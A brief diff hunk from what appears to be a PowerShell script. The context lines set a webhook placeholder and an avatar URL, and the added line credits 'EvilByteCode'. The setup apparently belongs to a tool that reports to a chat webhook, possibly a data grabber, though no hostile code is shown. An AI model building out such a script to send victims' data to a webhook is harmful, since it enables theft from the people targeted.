@@ -30,6 +30,8 @@ Add-Type -AssemblyName PresentationCore, PresentationFramework
 $webhook = "YOUR_WEBHOOK_HERE"
 $avatar = "https://i.postimg.cc/k58gQ03t/PTG.gif"
 
+
+#THIS CODE WAS MADE BY EvilByteCode
 Add-Type -TypeDefinition @"
 using System;
 using System.Diagnostics;
